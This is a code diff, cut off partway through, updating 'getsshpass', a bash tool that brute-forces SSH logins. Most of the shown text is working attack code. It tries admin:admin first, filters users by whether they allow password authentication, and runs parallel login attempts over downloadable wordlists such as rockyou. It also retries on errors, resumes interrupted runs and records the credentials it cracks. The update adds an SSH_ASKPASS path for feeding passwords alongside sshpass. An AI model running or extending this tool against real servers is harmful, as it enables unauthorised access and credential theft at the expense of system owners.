@@ -19,10 +19,13 @@ set -o pipefail
 # Constants and globals
 ##############################
 
-readonly VERSION="1.0"                                  # edit on every release
+readonly VERSION="1.1"                                  # edit on every release
 readonly SCRIPT_DIR="$(cd "$(dirname "${0}")" && pwd)"  # script absolute path
 readonly STATE_BASE="${SCRIPT_DIR}/.getsshpass"         # per-host subdirs
+readonly RETRY_SLEEP="0.05" # sleep between SSH connection error retries
+readonly POLL_SLEEP="0.05"  # sleep between job-slot availability polls
 
+declare ASKPASS_SCRIPT=""     # path to temp SSH_ASKPASS helper script
 declare STATE_DIR=""          # per-host state subdirectory path
 declare RESULT_FILE=""        # path to result.txt (found credentials)
 declare RESUME_FILE=""        # path to resume.txt (last attempted pair)
@@ -31,12 +34,13 @@ declare FILTERED_USERLIST=""  # path to filtered_users.txt (users with password)
 declare port="22"         # target SSH port
 declare delay="0.04"      # delay between attempts in seconds
 declare max_jobs="0"      # max parallel SSH jobs; 0 = unlimited
-declare max_retries="50"  # max retries per attempt on SSH errors (3, 255)
+declare max_retries="50"  # max retries per attempt on SSH errors (255)
 declare ssh_timeout="8"   # SSH connection timeout in seconds
 
 declare host=""            # target SSH hostname or IP
 declare clear_state=""     # set by --clear flag
 declare list_wordlists=""  # set by --list flag
+declare use_sshpass=""     # set by --sshpass flag
 declare userlist=""        # active username file (trimmed on resume)
 declare userlist_orig=""   # original username file path (for .new cleanup)
 declare passlist=""        # active password file (trimmed on resume)
@@ -49,6 +53,8 @@ declare -a download_names=()  # wordlists to fetch (-f/--fetch)
 
 declare -i attempt=0         # running attempt counter
 declare -i total_attempts=0  # total combinations to try
+declare -i maxusercount=0    # total users (set in restore_progress, read by progress_bar_setup)
+declare -i maxpasscount=0    # total passwords (set in restore_progress, read by progress_bar_setup)
 
 ##############################
 # Terminal colors and logging
@@ -75,13 +81,17 @@ msg_ok() {
 }
 
 msg_fail() {
-  printf '%(%Y-%m-%d %H:%M:%S)T [%bERROR%b] %s\n' \
-    -1 "${RED}" "${RESET}" "${*}" >&2
+  printf 'Error: %s\n' "${*}" >&2
 }
 
 msg_warn() {
   printf '%(%Y-%m-%d %H:%M:%S)T [%bWARN %b] %s\n' \
     -1 "${YELLOW}" "${RESET}" "${*}" >&2
+}
+
+msg_error() {
+  printf '%(%Y-%m-%d %H:%M:%S)T [%bERROR%b] %s\n' \
+    -1 "${RED}" "${RESET}" "${*}" >&2
 }
 
 msg_info() {
@@ -93,9 +103,25 @@ msg_info() {
 # Usage and version
 ##############################
 
+# Print ASCII banner.
+banner() {
+  cat <<'EOF'
+                __                 __
+   _____  _____/  |_  ______ _____|  |__ ___________    ______ ______
+  / ___ \/ __ \   __\/  ___//  ___/  |  \\____ \__  \  /  ___//  ___/
+ / /_/  /  ___/|  |  \___ \ \___ \|   Y  \  |_\ / __ \_\___  \\___  \
+ \___  / \___  |__| /____  \____  \___|  /   __(____  /____  /____  /
+/_____/      \/          \/     \/     \/|__|       \/     \/     \/
+
+EOF
+}
+
 # Print usage information and available options.
 usage() {
+  banner
   cat <<EOF
+                                                               v${VERSION}
+
 Usage: $(basename "${0}") [OPTIONS]
 
 OPTIONS:
@@ -108,8 +134,9 @@ OPTIONS:
    -r, --retries N        Max retries per attempt on transient SSH errors [default: 50]
    -t, --timeout SECS     SSH connection timeout in seconds [default: 8]
    -c, --clear            Clear all state files (results, resume, filtered users)
-   -f, --fetch NAME       Download a wordlist (rockyou, 10k, 100k)
+   -f, --fetch NAME       Download a wordlist (top-usernames, rockyou, 10k, 100k)
    -l, --list             List available wordlists
+   -s, --sshpass          Use sshpass instead of SSH_ASKPASS (requires sshpass)
    -v, --version          Display version
    -h, --help             Display help
 
@@ -123,8 +150,9 @@ EOF
 
 # Print version and license information.
 version() {
+  banner
   cat <<EOF
-getsshpass ${VERSION}
+                                                               v${VERSION}
 
 Copyright (C) 2016-2026:
 
@@ -154,14 +182,14 @@ init_state_dir() {
 clear_state_files() {
   if [[ -n "${host}" ]]; then
     rm -rf "${STATE_BASE}/${host}"
-    msg_ok "State files cleared for host '${host}'"
+    printf 'State files cleared for host '\''%s'\''\n' "${host}"
   else
     rm -rf "${STATE_BASE}"
-    msg_ok "All state files cleared"
+    printf 'All state files cleared\n'
   fi
 }
 
-# Terminate all tracked child processes and remove temporary .new files.
+# Terminate all tracked child processes and remove temporary files.
 cleanup() {
   for pid in "${CHILD_PIDS[@]}"; do
     kill "${pid}" 2>/dev/null
@@ -174,6 +202,9 @@ cleanup() {
     && rm -f "${userlist_orig}.new"
   [[ -n "${passlist_orig}" && -f "${passlist_orig}.new" ]] \
     && rm -f "${passlist_orig}.new"
+
+  [[ -n "${ASKPASS_SCRIPT}" && -f "${ASKPASS_SCRIPT}" ]] \
+    && rm -f "${ASKPASS_SCRIPT}"
 }
 
 ##############################
@@ -189,11 +220,16 @@ list_available_wordlists() {
     exit 1
   fi
 
-  msg_info "Available wordlists:"
-  printf '\n'
+  local col_width=0
   while IFS='|' read -r wl_name wl_file wl_desc wl_url; do
     [[ "${wl_name}" =~ ^#.*$ || -z "${wl_name}" ]] && continue
-    printf "%-10s %s\n" "${wl_name}" "${wl_desc}"
+    (( ${#wl_name} > col_width )) && col_width=${#wl_name}
+  done < "${catalog}"
+
+  printf 'Available wordlists:\n\n'
+  while IFS='|' read -r wl_name wl_file wl_desc wl_url; do
+    [[ "${wl_name}" =~ ^#.*$ || -z "${wl_name}" ]] && continue
+    printf "%-${col_width}s  %s\n" "${wl_name}" "${wl_desc}"
   done < "${catalog}"
 }
 
@@ -231,8 +267,10 @@ download_wordlist() {
         # Cursor up + carriage return + clear line:
         # overwrites curl's progress bar
         printf '\033[A\r\033[K'
+        local fmt_lines
+        format_number "${lines}" fmt_lines
         msg_ok "Downloaded '${wl_file}'" \
-          "($(format_number "${lines}") lines)"
+          "(${fmt_lines} lines)"
       else
         printf '\033[A\r\033[K'
         msg_fail "Failed to download '${wl_file}'"
@@ -254,7 +292,8 @@ download_wordlist() {
 # Helpers
 ##############################
 
-# Format a number with thousand separators (e.g. 1234567 -> 1,234,567).
+# Format NUMBER with thousand separators into VARNAME.
+# Usage: format_number NUMBER VARNAME  (e.g. format_number 1234567 result)
 # Pure bash, no subprocesses.
 format_number() {
   local n="${1}" i len result=""
@@ -263,38 +302,115 @@ format_number() {
     (( i > 0 && (len - i) % 3 == 0 )) && result+=","
     result+="${n:i:1}"
   done
-  printf '%s' "${result}"
+  printf -v "${2}" '%s' "${result}"
 }
 
 ##############################
 # Progress bar and time tracking
 ##############################
 
-# Bottom progress bar (apt-style). Uses terminal scroll region to pin a bar
-# at the last row while normal output scrolls above it.
+# Progress bar pinned at the bottom row; Tried/Remaining lines pinned
+# immediately after "Starting attack..." via cursor-position query (DSR).
 declare -i PB_ROWS=0
 declare -i PB_COLS=0
 declare PB_FMT_TOTAL=""
 declare -i PB_BAR_WIDTH=0
+declare -i PB_TRIED_ROW=0
+declare -i PB_REMAIN_ROW=0
+declare -i PB_DRAW_ROW=0     # row where the current attempt line is always drawn
+declare -i PB_SCROLL_BOTTOM=0 # bottom row of the scroll region
 
 progress_bar_setup() {
+  local is_resize="${1:-0}"
   PB_ROWS="$(tput lines 2>/dev/null)"
   PB_COLS="$(tput cols 2>/dev/null)"
-  (( PB_ROWS > 1 && PB_COLS > 0 )) || return
-  PB_FMT_TOTAL="$(format_number "${total_attempts}")"
+  PB_TRIED_ROW=0; PB_REMAIN_ROW=0; PB_DRAW_ROW=0; PB_SCROLL_BOTTOM=0
+  (( PB_ROWS > 4 && PB_COLS > 0 )) || return
+  format_number "${total_attempts}" PB_FMT_TOTAL
   local max_label="${PB_FMT_TOTAL}/${PB_FMT_TOTAL}"
   PB_BAR_WIDTH=$(( PB_COLS - 10 - ${#max_label} ))
   (( PB_BAR_WIDTH < 10 )) && PB_BAR_WIDTH=10
-  # Save cursor, set scroll region to rows 1..(last-1), restore cursor.
-  # This reserves the bottom row for the progress bar while
-  # normal output scrolls above it without overwriting the bar.
-  printf '\033[s\033[1;%dr\033[u' "$(( PB_ROWS - 1 ))"
+
+  # Query cursor row via ANSI DSR (ESC[6n → terminal replies ESC[row;colR).
+  local cpr=''
+  printf '\033[6n' >/dev/tty
+  IFS= read -r -s -d 'R' -t 1 cpr </dev/tty 2>/dev/null
+  cpr="${cpr##*\[}"
+  local cursor_row="${cpr%%;*}"
+
+  local fmt_tried fmt_remaining
+  format_number "${attempt}" fmt_tried
+  format_number "$(( total_attempts - attempt ))" fmt_remaining
+
+  if [[ "${cursor_row}" =~ ^[0-9]+$ ]] \
+      && (( cursor_row >= 1 && cursor_row + 3 < PB_ROWS )); then
+    PB_TRIED_ROW="${cursor_row}"
+    PB_REMAIN_ROW=$(( cursor_row + 1 ))
+    # Print Tried and Remaining right here — they stay pinned above the
+    # scroll region that starts on the next line.
+    printf '%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] Passwords tried:             %s\n' \
+      -1 "${CYAN}" "${RESET}" "${fmt_tried}"
+    printf '%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] Passwords remaining:         %s\n' \
+      -1 "${CYAN}" "${RESET}" "${fmt_remaining}"
+    # Layout: Tried, Remaining, attempt (PB_DRAW_ROW), scroll region, bar.
+    # Attempt is pinned right below Remaining (outside the scroll region so
+    # background \n cannot scroll it away). DECSTBM homes cursor to row 1;
+    # move it to PB_SCROLL_BOTTOM so background writes stay in the region.
+    PB_DRAW_ROW=$(( PB_REMAIN_ROW + 1 ))
+    PB_SCROLL_BOTTOM=$(( PB_ROWS - 1 ))
+    printf '\033[%d;%dr\033[%d;1H\033[?25l' \
+      "$(( PB_DRAW_ROW + 1 ))" "$(( PB_ROWS - 1 ))" \
+      "$(( PB_ROWS - 1 ))"
+  else
+    # DSR unavailable or cursor too close to bottom — fall back to reserving
+    # 5 bottom rows: Tried (PB_ROWS-4), Remaining (PB_ROWS-3), attempt
+    # (PB_ROWS-2), blank (PB_ROWS-1), bar (PB_ROWS). Scroll region is 1 to
+    # PB_ROWS-5; the blank row visually separates the attempt line from the bar.
+    PB_SCROLL_BOTTOM=$(( PB_ROWS - 5 ))
+    if (( PB_SCROLL_BOTTOM < 1 )); then
+      PB_TRIED_ROW=0; PB_REMAIN_ROW=0; PB_DRAW_ROW=0; PB_SCROLL_BOTTOM=0
+      return
+    fi
+    PB_TRIED_ROW=$(( PB_ROWS - 4 ))
+    PB_REMAIN_ROW=$(( PB_ROWS - 3 ))
+    PB_DRAW_ROW=$(( PB_ROWS - 2 ))
+    # Set scroll region and hide cursor.
+    printf '\033[1;%dr\033[?25l' "${PB_SCROLL_BOTTOM}"
+    # On a fresh setup (not a resize), the stats lines (Users, Passwords,
+    # Combinations, Starting attack...) may have scrolled into the reserved
+    # rows and been lost. Reprint them into the scroll region by positioning
+    # at PB_SCROLL_BOTTOM and printing with \n — each \n scrolls the region
+    # up one row, placing the line safely above PB_TRIED_ROW.
+    if (( ! is_resize )); then
+      local fmt_val
+      format_number "${maxusercount}" fmt_val
+      printf '\033[%d;1H\033[K%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] Users:                       %s\n' \
+        "${PB_SCROLL_BOTTOM}" -1 "${CYAN}" "${RESET}" "${fmt_val}"
+      format_number "${maxpasscount}" fmt_val
+      printf '\033[%d;1H\033[K%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] Passwords:                   %s\n' \
+        "${PB_SCROLL_BOTTOM}" -1 "${CYAN}" "${RESET}" "${fmt_val}"
+      format_number "${total_attempts}" fmt_val
+      printf '\033[%d;1H\033[K%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] Combinations:                %s\n' \
+        "${PB_SCROLL_BOTTOM}" -1 "${CYAN}" "${RESET}" "${fmt_val}"
+      if (( attempt > 0 )); then
+        format_number "${attempt}" fmt_val
+        printf '\033[%d;1H\033[K%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] Previously tried passwords:  %s\n' \
+          "${PB_SCROLL_BOTTOM}" -1 "${CYAN}" "${RESET}" "${fmt_val}"
+      fi
+      printf '\033[%d;1H\033[K%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] Starting attack...' \
+        "${PB_SCROLL_BOTTOM}" -1 "${CYAN}" "${RESET}"
+    fi
+    # Erase reserved rows, then park cursor at scroll region bottom.
+    printf '\033[%d;1H\033[J\033[%d;1H' \
+      "${PB_TRIED_ROW}" "${PB_SCROLL_BOTTOM}"
+  fi
 }
 
 progress_bar_draw() {
-  # \r = carriage return, \033[K = clear to end of line,
-  # \033[?7l = disable line wrap (prevents spillover on long lines)
-  printf '\r\033[K\033[?7l'
+  # Jump to PB_DRAW_ROW (absolute) so background subprocesses that wrote \n
+  # and moved the cursor elsewhere don't cause the attempt line to land on
+  # a pinned row. \033[K clears the line; \033[?7l disables wrap.
+  printf '\033[%d;1H\033[K\033[?7l' "${PB_DRAW_ROW}"
   printf '%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] ' \
     -1 "${CYAN}" "${RESET}"
   printf \
@@ -306,40 +422,43 @@ progress_bar_draw() {
 
 progress_bar_update() {
   local current="${1}" total="${2}"
-  local pct filled empty label fmt_current fill_str empty_str
+  local pct filled empty fmt_current fmt_remaining fill_str empty_str
   if (( total > 0 )); then
     pct=$(( current * 100 / total ))
   else
     pct=0
   fi
-  local n="${current}" i len
-  fmt_current=""; len=${#n}
-  for (( i=0; i<len; i++ )); do
-    (( i > 0 && (len - i) % 3 == 0 )) && fmt_current+=","
-    fmt_current+="${n:i:1}"
-  done
-  label="${fmt_current}/${PB_FMT_TOTAL}"
+  format_number "${current}" fmt_current
+  format_number "$(( total - current ))" fmt_remaining
   filled=$(( pct * PB_BAR_WIDTH / 100 ))
   empty=$(( PB_BAR_WIDTH - filled ))
-  # printf -v assigns to a variable without forking a subshell
   printf -v fill_str '%*s' "${filled}" ''
   printf -v empty_str '%*s' "${empty}" ''
-  # ${fill_str// /█} replaces each space with a block char.
-  # Sequence: save cursor, jump to bottom row, clear line,
-  # disable wrap, draw bar, re-enable wrap, restore cursor.
-  printf '\033[s\033[%d;0H\033[K\033[?7l[%b%s%b] %3d%% | %s\033[?7h\033[u' \
+  printf '\033[%d;1H\033[K\033[?7l' "${PB_TRIED_ROW}"
+  printf '%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] Passwords tried:             %s\033[?7h' \
+    -1 "${CYAN}" "${RESET}" "${fmt_current}"
+  printf '\033[%d;1H\033[K\033[?7l' "${PB_REMAIN_ROW}"
+  printf '%(%Y-%m-%d %H:%M:%S)T [%bINFO %b] Passwords remaining:         %s\033[?7h' \
+    -1 "${CYAN}" "${RESET}" "${fmt_remaining}"
+  printf '\033[%d;1H\033[K\033[?7l[%b%s%b] %3d%% | %s/%s\033[?7h' \
     "${PB_ROWS}" "${GREEN}" "${fill_str// /█}${empty_str}" \
-    "${RESET}" "${pct}" "${label}"
+    "${RESET}" "${pct}" "${fmt_current}" "${PB_FMT_TOTAL}"
+  # Return cursor to scroll region bottom so background subprocesses writing
+  # \n stay inside the scroll region and cannot land on a pinned row.
+  printf '\033[%d;1H' "${PB_SCROLL_BOTTOM}"
 }
 
 progress_bar_clear() {
+  (( PB_TRIED_ROW > 0 )) || return
   local rows
   rows="$(tput lines 2>/dev/null)"
-  (( rows > 0 )) || return
-  # Save cursor, jump to bottom row, clear it,
-  # reset scroll region to full terminal, restore cursor.
-  printf '\033[s\033[%d;0H\033[K\033[1;%dr\033[u' \
-    "${rows}" "${rows}"
+  (( rows > 0 )) || rows="${PB_ROWS}"
+  # Reset scroll region and restore cursor unconditionally — if tput failed
+  # and we skipped this, the scroll region would stay active after exit.
+  # Use \033[r (no-param DECSTBM) as belt-and-suspenders reset.
+  printf '\033[r\033[1;%dr\033[?25h' "${rows}"
+  # DECSTBM above homes cursor to row 1; move to PB_TRIED_ROW and erase down.
+  printf '\033[%d;1H\033[J' "${PB_TRIED_ROW}"
 }
 
 elapsed_time() {
@@ -435,6 +554,10 @@ read_args() {
         list_wordlists=1
         shift
         ;;
+      -s|--sshpass)
+        use_sshpass=1
+        shift
+        ;;
       -v|--version)
         version
         ;;
@@ -444,12 +567,10 @@ read_args() {
         ;;
       -*)
         msg_fail "Unknown option: ${1}"
-        usage
         exit 1
         ;;
       *)
         msg_fail "Unexpected argument: ${1}"
-        usage
         exit 1
         ;;
     esac
@@ -460,7 +581,6 @@ read_args() {
 validate_host() {
   if [[ -z "${host}" ]]; then
     msg_fail "Host address cannot be empty"
-    usage
     exit 1
   fi
 
@@ -482,7 +602,6 @@ validate_host() {
     if [[ ! "${host}" =~ ${host_regex} ]]; then
       msg_fail \
         "'${host}' is not a valid IP address or hostname"
-      usage
       exit 1
     fi
   fi
@@ -494,7 +613,6 @@ validate_port() {
       || [[ ! "${port}" =~ ^[1-9][0-9]*$ ]] \
       || (( port > 65535 )); then
     msg_fail "TCP port must be a number in range 1-65535"
-    usage
     exit 1
   fi
 }
@@ -520,10 +638,32 @@ check_args() {
     exit 0
   fi
 
-  if ! command -v sshpass &>/dev/null; then
+  if ! command -v ssh &>/dev/null; then
+    msg_fail "Utility 'ssh' not found." \
+      "Install openssh-client with your package manager."
+    exit 1
+  fi
+
+  if [[ -n "${use_sshpass}" ]] && ! command -v sshpass &>/dev/null; then
     msg_fail "Utility 'sshpass' not found." \
       "Install it with your package manager."
     exit 1
+  fi
+
+  if [[ -z "${use_sshpass}" ]]; then
+    local ssh_ver_str ssh_major ssh_minor
+    ssh_ver_str="$(ssh -V 2>&1)"
+    if [[ "${ssh_ver_str}" =~ OpenSSH_([0-9]+)\.([0-9]+) ]]; then
+      ssh_major="${BASH_REMATCH[1]}"
+      ssh_minor="${BASH_REMATCH[2]}"
+      if (( ssh_major < 8 || (ssh_major == 8 && ssh_minor < 4) )); then
+        msg_fail \
+          "OpenSSH ${ssh_major}.${ssh_minor} detected;" \
+          "SSH_ASKPASS_REQUIRE=force requires OpenSSH 8.4+." \
+          "Use -s/--sshpass instead."
+        exit 1
+      fi
+    fi
   fi
 
   validate_host
@@ -547,7 +687,7 @@ check_args() {
     exit 1
   fi
 
-  if [[ ! "${delay}" =~ ^[0-9]*\.?[0-9]+$ ]]; then
+  if [[ ! "${delay}" =~ ^[0-9]*\.?[0-9]*$ ]] || [[ -z "${delay//./}" ]]; then
     msg_fail \
       "Delay (-w/--wait) must be a non-negative number"
     exit 1
@@ -561,8 +701,8 @@ check_args() {
       "s/.*username: '\\([^']*\\)'.*/\\1/p" "${RESULT_FILE}")"
     saved_pass="$(sed -n \
       "s/.*password: '\\(.*\\)'/\\1/p" "${RESULT_FILE}")"
-    msg_warn "Previous result found for '${host}':" \
-      "user '${saved_user}', password '${saved_pass}'"
+    printf 'Warning: Previous result found for '\''%s'\'': user '\''%s'\'', password '\''%s'\''\n' \
+      "${host}" "${saved_user}" "${saved_pass}"
     printf "Run again anyway? [y/N] "
     read -r answer
     if [[ "${answer}" =~ ^[Yy]$ ]]; then
@@ -573,39 +713,30 @@ check_args() {
     fi
   fi
 
+  local errors=0
   if [[ ! -f "${passlist}" ]]; then
-    msg_fail \
-      "Cannot find password file: '${passlist:-<not specified>}'"
-    usage
-    exit 1
+    msg_fail "Cannot find password file: '${passlist:-<not specified>}'"
+    (( errors++ ))
+  elif [[ ! -r "${passlist}" ]]; then
+    msg_fail "Cannot read password file: '${passlist}'"
+    (( errors++ ))
+  elif [[ ! -s "${passlist}" ]]; then
+    msg_fail "Password file is empty: '${passlist}'"
+    (( errors++ ))
   fi
 
   if [[ ! -f "${userlist}" ]]; then
-    msg_fail \
-      "Cannot find username file: '${userlist:-<not specified>}'"
-    usage
-    exit 1
-  fi
-
-  if [[ ! -r "${passlist}" ]]; then
-    msg_fail "Cannot read password file: '${passlist}'"
-    exit 1
-  fi
-
-  if [[ ! -r "${userlist}" ]]; then
+    msg_fail "Cannot find username file: '${userlist:-<not specified>}'"
+    (( errors++ ))
+  elif [[ ! -r "${userlist}" ]]; then
     msg_fail "Cannot read username file: '${userlist}'"
-    exit 1
-  fi
-
-  if [[ ! -s "${passlist}" ]]; then
-    msg_fail "Password file is empty: '${passlist}'"
-    exit 1
-  fi
-
-  if [[ ! -s "${userlist}" ]]; then
+    (( errors++ ))
+  elif [[ ! -s "${userlist}" ]]; then
     msg_fail "Username file is empty: '${userlist}'"
-    exit 1
+    (( errors++ ))
   fi
+
+  (( errors > 0 )) && exit 1
 
   mkdir -p "${STATE_DIR}" || {
     msg_fail \
@@ -621,29 +752,75 @@ check_args() {
 # SSH operations
 ##############################
 
+# Create a temporary SSH_ASKPASS helper that reads SSH_PASSWORD from the env.
+# SSH_ASKPASS_REQUIRE=force (OpenSSH 8.4+) makes SSH call this helper instead
+# of prompting, even when a terminal is present.
+create_askpass_helper() {
+  [[ -n "${use_sshpass}" ]] && return
+  ASKPASS_SCRIPT="$(mktemp)" || {
+    msg_fail "Cannot create temp file for SSH_ASKPASS helper"
+    exit 1
+  }
+  printf '#!/bin/sh\nprintf "%%s\\n" "${SSH_PASSWORD}"\n' \
+    > "${ASKPASS_SCRIPT}" || {
+    msg_fail "Cannot write SSH_ASKPASS helper script"
+    exit 1
+  }
+  chmod +x "${ASKPASS_SCRIPT}" || {
+    msg_fail "Cannot make SSH_ASKPASS helper script executable"
+    exit 1
+  }
+}
+
 # Quick-win credential test with admin:admin and SSH reachability check.
 check_ssh_connection() {
   msg_info "Checking SSH connection to '${host}:${port}'..."
 
-  sshpass -p admin ssh \
-    -o StrictHostKeyChecking=no \
-    -o PubkeyAuthentication=no \
-    -o ConnectTimeout="${ssh_timeout}" \
-    -p "${port}" "admin@${host}" exit &>/dev/null
-  local rvalssh=${?}
-
-  if [[ "${rvalssh}" -eq 0 ]]; then
-    msg_ok "Connection successful"
-    printf '%s\n' \
-      "Found username: 'admin' and password: 'admin'" \
-      > "${RESULT_FILE}"
-    evaluate_result
-  elif [[ "${rvalssh}" -eq 255 ]]; then
-    msg_fail \
-      "Cannot establish SSH connection to '${host}:${port}'"
-    exit 1
+  local rvalssh
+  if [[ -n "${use_sshpass}" ]]; then
+    sshpass -p admin ssh \
+      -o StrictHostKeyChecking=no \
+      -o PubkeyAuthentication=no \
+      -o ConnectTimeout="${ssh_timeout}" \
+      -p "${port}" "admin@${host}" exit &>/dev/null
+    rvalssh=${?}
+    if [[ "${rvalssh}" -eq 0 ]]; then
+      msg_ok "Connection successful"
+      printf '%s\n' \
+        "Found username: 'admin' and password: 'admin'" \
+        > "${RESULT_FILE}"
+      evaluate_result
+    elif [[ "${rvalssh}" -eq 255 || "${rvalssh}" -eq 3 ]]; then
+      msg_error \
+        "Cannot establish SSH connection to '${host}:${port}'"
+      exit 1
+    else
+      msg_ok "Connection successful"
+    fi
   else
-    msg_ok "Connection successful"
+    local ssh_err
+    ssh_err=$(SSH_ASKPASS="${ASKPASS_SCRIPT}" SSH_ASKPASS_REQUIRE=force \
+      SSH_PASSWORD=admin ssh \
+      -o StrictHostKeyChecking=no \
+      -o PubkeyAuthentication=no \
+      -o NumberOfPasswordPrompts=1 \
+      -o ConnectTimeout="${ssh_timeout}" \
+      -p "${port}" "admin@${host}" exit 2>&1 >/dev/null)
+    rvalssh=${?}
+    if [[ "${rvalssh}" -eq 0 ]]; then
+      msg_ok "Connection successful"
+      printf '%s\n' \
+        "Found username: 'admin' and password: 'admin'" \
+        > "${RESULT_FILE}"
+      evaluate_result
+    elif [[ "${rvalssh}" -eq 255 ]] \
+        && [[ "${ssh_err}" != *"Permission denied"* ]]; then
+      msg_error \
+        "Cannot establish SSH connection to '${host}:${port}'"
+      exit 1
+    else
+      msg_ok "Connection successful"
+    fi
   fi
 }
 
@@ -652,8 +829,7 @@ filter_users_by_password_auth() {
   if [[ -s "${FILTERED_USERLIST}" ]]; then
     local cached_count
     cached_count="$(grep -c '' "${FILTERED_USERLIST}")"
-    msg_info "Found cached user filter list" \
-      "(${cached_count} users with password authentication)"
+    msg_info "Cached filter: ${cached_count} users allow password authentication"
     printf "Reuse cached list? [Y/n] "
     read -r answer
     if [[ ! "${answer}" =~ ^[Nn]$ ]]; then
@@ -664,8 +840,7 @@ filter_users_by_password_auth() {
     fi
   fi
 
-  msg_info \
-    "Filtering users with password authentication enabled..."
+  msg_info "Filtering users by password authentication..."
 
   > "${FILTERED_USERLIST}"  # truncate file to start fresh
   local total_users
@@ -721,13 +896,11 @@ filter_users_by_password_auth() {
   fi
 
   if [[ ${filtered_count} -eq 0 ]]; then
-    msg_warn \
-      "No users with password authentication enabled found"
+    msg_warn "No users with password authentication found"
     exit 0
   fi
 
-  msg_info \
-    "Found ${filtered_count}/${total_users} users with password authentication enabled"
+  msg_info "${filtered_count}/${total_users} users allow password authentication"
   userlist="${FILTERED_USERLIST}"
   userlist_orig="${FILTERED_USERLIST}"
   fulluserlist="${FILTERED_USERLIST}"
@@ -787,7 +960,6 @@ restore_progress() {
     fi
   fi
 
-  local maxusercount maxpasscount
   local remaining_users remaining_passes
   maxusercount="$(grep -c '' "${fulluserlist}")"
   maxpasscount="$(grep -c '' "${fullpasslist}")"
@@ -799,6 +971,23 @@ restore_progress() {
   attempt=$(( total_attempts - remaining_passes \
     - (remaining_users - 1) * maxpasscount ))
   if (( attempt < 0 )); then attempt=0; fi
+
+  if (( attempt > 0 )); then
+    local fmt_val
+    format_number "${maxusercount}" fmt_val
+    msg_info "Users:                       ${fmt_val}"
+    format_number "${maxpasscount}" fmt_val
+    msg_info "Passwords:                   ${fmt_val}"
+    format_number "${total_attempts}" fmt_val
+    msg_info "Combinations:                ${fmt_val}"
+    format_number "${attempt}" fmt_val
+    msg_info "Previously tried passwords:  ${fmt_val}"
+    if [[ ! -t 1 ]]; then
+      local remaining=$(( total_attempts - attempt ))
+      format_number "${remaining}" fmt_val
+      msg_info "Passwords remaining:         ${fmt_val}"
+    fi
+  fi
 }
 
 ##############################
@@ -812,28 +1001,40 @@ try_ssh() {
   local retval=1
   local -i retries=0
 
+  local ssh_err
   while true; do
-    sshpass -p "${pass}" ssh \
-      -o StrictHostKeyChecking=no \
-      -o PubkeyAuthentication=no \
-      -o ConnectTimeout="${ssh_timeout}" \
-      -p "${port}" "${user}@${host}" exit &>/dev/null
-    retval=${?}
-
-    # sshpass: 0=success, 5=wrong password, 3=runtime error,
-    # 255=SSH connection failure. Retry only on transient errors.
-    [[ "${retval}" -ne 255 && "${retval}" -ne 3 ]] && break
+    if [[ -n "${use_sshpass}" ]]; then
+      sshpass -p "${pass}" ssh \
+        -o StrictHostKeyChecking=no \
+        -o PubkeyAuthentication=no \
+        -o ConnectTimeout="${ssh_timeout}" \
+        -p "${port}" "${user}@${host}" exit &>/dev/null
+      retval=${?}
+      # sshpass: 0=success, 5=auth failure, 3/255=connection error
+      [[ "${retval}" -eq 0 || "${retval}" -eq 5 ]] && break
+    else
+      ssh_err=$(SSH_ASKPASS="${ASKPASS_SCRIPT}" SSH_ASKPASS_REQUIRE=force \
+        SSH_PASSWORD="${pass}" ssh \
+        -o StrictHostKeyChecking=no \
+        -o PubkeyAuthentication=no \
+        -o NumberOfPasswordPrompts=1 \
+        -o ConnectTimeout="${ssh_timeout}" \
+        -p "${port}" "${user}@${host}" exit 2>&1 >/dev/null)
+      retval=${?}
+      # ssh exits 255 for both auth failure and connection errors.
+      # Only retry on connection errors (auth failure contains "Permission denied").
+      [[ "${retval}" -ne 255 ]] && break
+      [[ "${ssh_err}" == *"Permission denied"* ]] && break
+    fi
 
     # Another job already found the password - stop retrying
     [[ -f "${RESULT_FILE}" ]] && return
     if (( retries >= max_retries )); then
-      msg_warn \
-        "Max retries (${max_retries}) reached" \
-        "for user '${user}', password '${pass}'"
+      msg_warn "Max retries (${max_retries}) reached"
       return
     fi
     ((retries++))
-    sleep "${delay}"
+    sleep "${RETRY_SLEEP}"
   done
 
   if [[ "${retval}" -eq 0 ]]; then
@@ -857,36 +1058,52 @@ prune_finished_pids() {
 # Block until a background job slot is available.
 wait_for_job_slot() {
   (( max_jobs == 0 )) && return
-  while (( $(jobs -rp | wc -l) >= max_jobs )); do
-    sleep 0.05
+  while true; do
+    prune_finished_pids
+    (( ${#CHILD_PIDS[@]} < max_jobs )) && return
+    sleep "${POLL_SLEEP}"
   done
 }
 
-# Main attack loop.
-launch_attack() {
-  local maxusercount maxpasscount
-  maxusercount="$(grep -c '' "${fulluserlist}")"
-  maxpasscount="$(grep -c '' "${fullpasslist}")"
-  local jobs_label
+# Print attack configuration summary before pre-flight checks.
+print_attack_config() {
+  local ssh_method jobs_label
+  if [[ -n "${use_sshpass}" ]]; then
+    ssh_method="sshpass"
+  else
+    ssh_method="SSH_ASKPASS"
+  fi
   if (( max_jobs == 0 )); then
     jobs_label="unlimited"
   else
     jobs_label="max ${max_jobs}"
   fi
+  msg_info "Target:              ${host}:${port}"
+  msg_info "SSH method:          ${ssh_method}"
+  msg_info "SSH parallel jobs:   ${jobs_label}"
+  msg_info "SSH delay:           ${delay}s"
+  msg_info "SSH timeout:         ${ssh_timeout}s"
+  msg_info "SSH retries:         ${max_retries}"
+}
+
+# Main attack loop.
+launch_attack() {
   # Reset bash builtin timer so elapsed_time() measures attack only
   SECONDS=0
-  msg_info "Starting attack against ${host}:${port}" \
-    "(${jobs_label} parallel jobs, ${delay}s delay)"
-  msg_info \
-    "Users to try: $(format_number "${maxusercount}")"
-  msg_info \
-    "Passwords to try: $(format_number "${maxpasscount}")"
-  msg_info \
-    "Total combinations: $(format_number "${total_attempts}")"
+  local fmt_val fmt_att fmt_tot
+  if (( attempt == 0 )); then
+    format_number "${maxusercount}" fmt_val
+    msg_info "Users:                       ${fmt_val}"
+    format_number "${maxpasscount}" fmt_val
+    msg_info "Passwords:                   ${fmt_val}"
+    format_number "${total_attempts}" fmt_val
